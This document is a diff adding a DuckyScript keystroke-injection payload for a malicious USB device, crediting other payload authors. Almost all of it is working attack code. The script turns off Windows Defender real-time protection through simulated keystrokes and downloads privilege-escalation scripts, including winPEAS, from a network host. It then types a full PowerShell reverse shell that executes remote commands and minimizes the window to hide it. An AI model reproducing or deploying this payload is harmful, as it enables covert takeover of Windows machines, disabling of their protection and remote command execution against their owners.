@@ -1,0 +1,76 @@
+REM Credits:
+REM Disable Windows Defender by Zero_Sploit (v1.0)
+REM Hidden_access by makozort 
+REM powershell-reverse-shell by martinsohn
+
+REM Pause for everything to recognize and be ready
+DELAY 2000
+
+REM FIRST STEP: DEACTIVATING WINDOWS Defender
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 1000
+STRING windows security
+DELAY 1000
+ENTER
+DELAY 2000
+ENTER
+
+REM Navigate to Manage Settings
+DELAY 750
+TAB
+DELAY 750
+TAB
+DELAY 750 
+TAB
+DELAY 750
+TAB
+DELAY 750
+ENTER
+DELAY 750
+
+REM Open and turn off Realtime Protection
+SPACE
+DELAY 1000
+ALT y
+DELAY 1000
+
+REM Exit security settings
+ALT F4
+DELAY 500
+
+REM STEP 2: OPENING REVERSE SHELL 
+
+GUI r
+DELAY 600
+STRING powershell
+ENTER
+DELAY 800
+
+REM Dowloading a set of tools
+STRING mkdir .hidden
+ENTER
+STRING cd .hidden
+ENTER
+DELAY 600
+STRING curl http://192.168.1.6:8000/privsec.ps1 -o pvsec.ps1
+ENTER
+DELAY 1000
+STRING curl http://192.168.1.6:8000/winPEAS.ps1 -o wpeas.ps1
+ENTER
+DELAY 1000
+
+
+REM REVERSE SHELL CMD
+STRING do {try{$TCPClient = New-Object Net.Sockets.TCPClient('192.168.1.6', 9991)} catch {}} until ($TCPClient.Connected);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String};WriteToStream ($Output)};$StreamWriter.Close()
+ENTER
+
+REM MINIMIZING THE POWERSHELL
+ALT SPACE
+DOWN
+DOWN
+DOWN
+DOWN
+ENTER
+
+
